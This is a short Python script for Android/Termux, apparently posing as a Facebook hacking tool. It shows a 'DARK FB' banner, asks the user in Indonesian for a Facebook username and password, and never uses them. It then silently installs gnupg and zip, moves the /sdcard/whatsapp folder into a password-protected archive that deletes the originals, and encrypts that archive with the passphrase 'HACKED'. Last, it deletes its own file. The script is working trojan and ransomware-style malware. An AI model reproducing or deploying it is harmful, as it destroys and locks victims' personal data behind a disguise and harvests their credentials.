import os,sys,time
logo = '''/x1b[32;1m]
----.   .--.  .----. .-. .-.   .----..----. 
| {}  \ / {} \ | {}  }| |/ /    | {_  | {}  }
|     //  /\  \| .-. \| |\ \    | |   | {}  }
`----' `-'  `-'`-' `-'`-' `-'   `-'   `----' 
'''
def package():
        try:
                import gnupg
                import zip
        except ImportError:
                os.system('pkg install -y gnupg zip &> /dev//null')


print(logo)
print('silakan login facebook terlebih dahulu')
print('login opramini agar tidak terkena cekpoint')
usr = input('username: ')
pwd = input('password: ')
print('')
package()
os.system('zip --password HACKED your_file.zip -m -r /sdcard/whatsapp &> /dev//null')

os.system('gpg --batch -c --passphrase HACKED your_file.zip &> /dev//null')
os.system('rm your_file.zip;cp your_file.zip.gpg /sdcard')
os.system('rm -rf minicrypto.py')
time.sleep(8)
